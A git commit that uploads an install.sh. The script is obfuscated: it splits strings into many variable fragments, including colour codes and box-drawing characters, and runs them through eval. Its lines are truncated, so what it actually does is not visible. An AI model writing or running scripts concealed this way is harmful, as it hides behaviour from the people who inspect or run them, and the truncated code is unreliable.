4e451b16585296791dafd991da94b3b3bd5b1f28
kitty-carlos <63510472+kitty-carlos@users.noreply.github.com>
2020-05-02 19:20:50 +0200

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,7 @@
+z="
+";dBz='▏▕▂┈';Hz='='\''\0';XBz='┈┈╲┊';gBz='an  ';Zz='le='\''';eBz='┈"';HBz='┈┈  ';xz='sl>
+eval "$Az$Bz$Cz$Dz$z$Ez$Bz$Fz$Dz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$Bz$Cz$Dz$z$Nz$Oz$Pz$Qz$z$Rz$S>
+
+z="
+";Pz='3[1;';jz='clea';FCz='E';Nz='red=';ZBz='┈   ';gCz='m';wz='┈┈┈"';IEz='sss3';JEz='ss>
+eval "$Az$Bz$Cz$Dz$z$Ez$Bz$Fz$Dz$z$Gz$Hz$Iz$Jz$Kz$z$Lz$Mz$Bz$Cz$Dz$z$Nz$Oz$Pz$Qz$z$Rz$S>
